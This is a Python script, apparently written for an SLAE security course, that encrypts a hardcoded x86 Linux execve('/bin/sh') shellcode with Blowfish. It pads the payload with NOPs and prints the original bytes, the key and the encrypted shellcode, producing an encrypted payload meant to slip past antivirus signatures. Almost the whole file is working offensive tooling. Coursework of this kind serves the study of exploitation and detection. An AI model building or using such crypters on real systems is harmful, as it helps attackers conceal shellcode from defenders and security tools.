#coding:utf-8
"""
Filename:      crypter.py
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  12.12.2018
Note:          Python3 Shellcode Crypter with blowfish symmetric algorithm

"""
import blowfish

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode_crypted = b""

# Input from console
key = input("Please enter a key between 4 and 56 caracters long:")
if len(key) < 4 or len(key) > 56:
    print("The size of the key is not correct, try harder!!!")
    exit()

# Create cipher with key
cipher = blowfish.Cipher(key.encode())

# Cast bytes to bytearray
shellcode_array = bytearray(shellcode)

# Complete the shellcode with NOP (\x90) instruction at the end to be a multiple of 8 bytes
i = 8 - (len(shellcode_array) % 8)
while i > 0 :
    i -= 1
    shellcode_array.append(144)       # 144 = 0x90

# Encrypt the shellcode with Blowfish algorithm by block of 8 bytes
l = ((len(shellcode_array)) / 8) + 1
i = 1
p = 0
while i < l :
    block = shellcode_array[p:8*i]
    shellcode_crypted += cipher.encrypt_block(block)
    i += 1
    p += 8

# Console ouptut
uncrypted = ""
for x in bytearray(shellcode_array):
    uncrypted += '\\x'
    uncrypted += '%02x' % x

crypted = ""
for x in bytearray(shellcode_crypted):
    crypted += '\\x'
    crypted += '%02x' % x

print("-" * 90)
print("Uncrypted shellcode:")
print("-" * 90)
print(uncrypted)
print("-" * 90)
print("Encryption key:")
print("-" * 90)
print(key)
print("-" * 90)
print("Encrypted shellcode:")
print("-" * 90)
print(crypted)
print("-" * 90)
print("Shellcode Length with padding:", len(bytearray(shellcode_crypted)))
